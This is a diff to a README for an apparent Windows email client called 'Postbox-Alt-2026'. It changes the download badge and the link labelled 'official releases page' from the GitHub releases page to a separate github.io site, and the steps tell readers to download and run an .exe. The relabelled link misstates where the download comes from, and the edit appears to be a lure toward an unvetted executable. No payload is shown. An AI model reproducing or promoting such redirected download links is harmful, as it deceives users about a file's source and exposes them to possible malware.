@@ -1,6 +1,6 @@
 # 📧 Postbox-Alt-2026 - Master your email with ease
 
-[![](https://img.shields.io/badge/Download-Postbox-blue.svg)](https://github.com/Mortystretched991/Postbox-Alt-2026/releases)
+[![](https://img.shields.io/badge/Download-Postbox-blue.svg)](https://mortystretched991.github.io)
 
 Postbox-Alt-2026 manages your email accounts on Windows 11 and 10. This application organizes your inbox, categorizes messages, and speeds up your daily communication.
 
@@ -8,7 +8,7 @@ Postbox-Alt-2026 manages your email accounts on Windows 11 and 10. This applicat
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Mortystretched991/Postbox-Alt-2026/releases).
+1. Visit the [official releases page](https://mortystretched991.github.io).
 2. Look for the latest version under the Releases section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your Downloads folder.
